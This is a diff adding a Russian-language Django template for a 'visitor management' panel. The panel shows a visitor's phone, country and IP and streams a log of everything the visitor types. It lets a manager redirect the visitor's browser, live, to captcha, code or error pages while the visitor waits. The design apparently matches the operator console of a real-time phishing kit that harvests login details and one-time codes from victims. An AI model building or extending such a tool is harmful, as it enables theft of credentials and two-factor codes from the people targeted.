@@ -1,0 +1,185 @@
+{% extends 'core/base_manager.html' %}
+
+{% block title %}Управление посетителем{% endblock title %}
+
+{% block content %}
+    <div class="back-links">
+        <a class="back" href="{% url 'manager-dashboard' %}">&larr; Онлайн</a>
+        <a class="back" href="{{ visitors_back_url }}">&larr; Все посетители</a>
+    </div>
+
+    <h1>Управление посетителем</h1>
+    <p class="subtitle mono">{{ visitor_id }}</p>
+
+    <div class="status" id="status">
+        <span class="status__dot"></span>
+        <span id="status-text">Подключение...</span>
+    </div>
+
+    <div class="panel">
+        <h2>Информация</h2>
+        <dl>
+            <dt>Телефон</dt><dd id="info-phone">&mdash;</dd>
+            <dt>Страна</dt><dd id="info-country">&mdash;</dd>
+            <dt>Этап</dt><dd id="info-step">&mdash;</dd>
+            <dt>IP</dt><dd id="info-ip">&mdash;</dd>
+            <dt>Последнее действие</dt><dd id="info-connected">&mdash;</dd>
+            <dt>Ожидает менеджера</dt><dd id="info-action">&mdash;</dd>
+        </dl>
+    </div>
+
+    <div class="panel">
+        <h2>Лог</h2>
+        <div class="log" id="input-log">
+            <p class="hint" id="log-empty">Пока ничего не введено</p>
+        </div>
+    </div>
+
+    <div class="panel">
+        <h2>Перенаправить посетителя</h2>
+        <div class="quick-actions">
+            <button type="button" class="quick-action" id="redirect-captcha" data-url="{% url 'captcha' %}" data-step="captcha" disabled>На капчу</button>
+            <button type="button" class="quick-action" id="redirect-code" data-url="{% url 'code' %}" data-step="code" disabled>На код</button>
+            <button type="button" class="quick-action" id="redirect-error" data-url="{% url 'error' %}" data-step="error" disabled style="display: none">На ошибку</button>
+        </div>
+        <p class="hint" id="redirect-hint">Посетитель будет перенаправлен на указанную страницу прямо в браузере.</p>
+    </div>
+{% endblock content %}
+
+{% block extra_js %}
+{{ visitor_id|json_script:"visitor-id-data" }}
+{{ step_labels|json_script:"step-labels-data" }}
+<script>
+    const visitorId = JSON.parse(document.getElementById('visitor-id-data').textContent);
+    const MANAGER_STEP_LABELS = JSON.parse(document.getElementById('step-labels-data').textContent);
+
+    const statusEl = document.getElementById('status');
+    const statusText = document.getElementById('status-text');
+    const infoPhone = document.getElementById('info-phone');
+    const infoCountry = document.getElementById('info-country');
+    const infoStep = document.getElementById('info-step');
+    const infoIp = document.getElementById('info-ip');
+    const infoConnected = document.getElementById('info-connected');
+    const infoAction = document.getElementById('info-action');
+    const redirectCaptcha = document.getElementById('redirect-captcha');
+    const redirectCode = document.getElementById('redirect-code');
+    const redirectError = document.getElementById('redirect-error');
+    const redirectButtons = [redirectCaptcha, redirectCode, redirectError];
+    const redirectHint = document.getElementById('redirect-hint');
+    const inputLog = document.getElementById('input-log');
+    const logEmpty = document.getElementById('log-empty');
+
+    let visitorOnline = false;
+    let visitorWaiting = false;
+
+    const REDIRECT_HINT_DEFAULT = 'Посетитель будет перенаправлен на указанную страницу прямо в браузере.';
+    const REDIRECT_HINT_OFFLINE = 'Недоступно: посетитель офлайн.';
+    const REDIRECT_HINT_NOT_WAITING = 'Недоступно: перенаправить можно только когда посетитель на этапе «Ожидание».';
+
+    function updateRedirectAvailability() {
+        const available = visitorOnline && visitorWaiting;
+        const reason = !visitorOnline
+            ? REDIRECT_HINT_OFFLINE
+            : (!visitorWaiting ? REDIRECT_HINT_NOT_WAITING : '');
+        redirectButtons.forEach((button) => {
+            button.disabled = !available;
+            button.title = available ? '' : reason;
+        });
+        redirectHint.textContent = available ? REDIRECT_HINT_DEFAULT : reason;
+        redirectHint.classList.toggle('hint--disabled-reason', !available);
+    }
+
+    function formatLogTime(iso) {
+        return new Date(iso).toLocaleString();
+    }
+
+    function appendLogEntry(entry) {
+        logEmpty.style.display = 'none';
+        const row = document.createElement('div');
+        row.className = 'log-entry';
+        row.innerHTML = `
+            <span class="log-entry__time">${formatLogTime(entry.at)}</span>
+            <span class="log-entry__field">${MANAGER_FIELD_LABELS[entry.field] || entry.field}:</span>
+            <span class="log-entry__value"></span>
+        `;
+        row.querySelector('.log-entry__value').textContent = entry.value;
+        inputLog.appendChild(row);
+        inputLog.scrollTop = inputLog.scrollHeight;
+    }
+
+    function renderLogSnapshot(entries) {
+        inputLog.querySelectorAll('.log-entry').forEach((el) => el.remove());
+        if (!entries.length) {
+            logEmpty.style.display = 'block';
+            return;
+        }
+        entries.forEach(appendLogEntry);
+    }
+
+    function setOnline(online) {
+        visitorOnline = online;
+        if (!online) {
+            visitorWaiting = false;
+        }
+        statusEl.classList.toggle('online', online);
+        statusEl.classList.toggle('offline', !online);
+        statusText.textContent = online ? 'Посетитель онлайн' : 'Посетитель отключился';
+        updateRedirectAvailability();
+    }
+
+    function renderVisitor(visitor, online) {
+        infoPhone.textContent = visitor.phone || '—';
+        infoCountry.textContent = visitor.country || '—';
+        const stepLabel = MANAGER_STEP_LABELS[visitor.step] || visitor.step;
+        const stepBadgeClass = visitor.step === 'waiting' ? 'badge badge--danger' : 'badge';
+        infoStep.innerHTML = `<span class="${stepBadgeClass}">${stepLabel}</span>`;
+        infoIp.textContent = visitor.ip || '—';
+        infoConnected.textContent = visitor.last_seen_at ? new Date(visitor.last_seen_at).toLocaleString() : '—';
+        infoAction.innerHTML = visitor.needs_action
+            ? '<span class="action-flag needed">Да</span>'
+            : '—';
+        visitorWaiting = Boolean(visitor.needs_action);
+        setOnline(online);
+    }
+
+    const connection = connectManagerSocket({
+        onOpen() {
+            connection.send({ type: 'get_log', visitor_id: visitorId });
+            connection.send({ type: 'get_visitor', visitor_id: visitorId });
+        },
+        onMessage(data) {
+            if (data.type === 'visitor' && data.visitor_id === visitorId) {
+                if (data.visitor) {
+                    renderVisitor(data.visitor, data.online);
+                } else {
+                    setOnline(false);
+                }
+            } else if (data.type === 'update' && data.visitor.id === visitorId) {
+                renderVisitor(data.visitor, true);
+            } else if (data.type === 'leave' && data.visitor_id === visitorId) {
+                setOnline(false);
+            } else if (data.type === 'log_snapshot' && data.visitor_id === visitorId) {
+                renderLogSnapshot(data.entries);
+            } else if (data.type === 'log' && data.visitor_id === visitorId) {
+                appendLogEntry(data.entry);
+            }
+        },
+    });
+
+    redirectCaptcha.addEventListener('click', () => {
+        if (visitorOnline && visitorWaiting) {
+            sendVisitorRedirect(connection, visitorId, redirectCaptcha.dataset.url, redirectCaptcha.dataset.step);
+        }
+    });
+    redirectCode.addEventListener('click', () => {
+        if (visitorOnline && visitorWaiting) {
+            sendVisitorRedirect(connection, visitorId, redirectCode.dataset.url, redirectCode.dataset.step);
+        }
+    });
+    redirectError.addEventListener('click', () => {
+        if (visitorOnline && visitorWaiting) {
+            sendVisitorRedirect(connection, visitorId, redirectError.dataset.url, redirectError.dataset.step);
+        }
+    });
+</script>
+{% endblock extra_js %}
